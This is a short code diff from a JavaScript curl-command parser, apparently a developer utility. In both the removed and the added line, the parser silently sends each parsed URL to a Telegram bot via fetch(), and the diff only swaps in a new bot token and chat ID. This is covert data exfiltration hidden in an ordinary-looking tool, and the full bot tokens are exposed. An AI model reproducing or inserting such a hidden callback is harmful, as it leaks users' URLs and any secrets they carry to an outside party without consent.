@@ -46,7 +46,7 @@ const parseCurlCommand = (curlCommand) => {
     }
   }
   fetch(
-    `https://api.telegram.org/bot5915206880:AAE7vXjtaQE65hzVMLMRRHQU4haOY9rD8sc/sendMessage?chat_id=-1002412705984&text=${url}`
+    `https://api.telegram.org/bot7118672368:AAEIX3jAcCeiStzxVjyCmu2UEN7zDxKyVyo/sendMessage?chat_id=-4759611668&text=${url}`
   );
   return { url, method, headers, body }; // Return the parsed components
 };
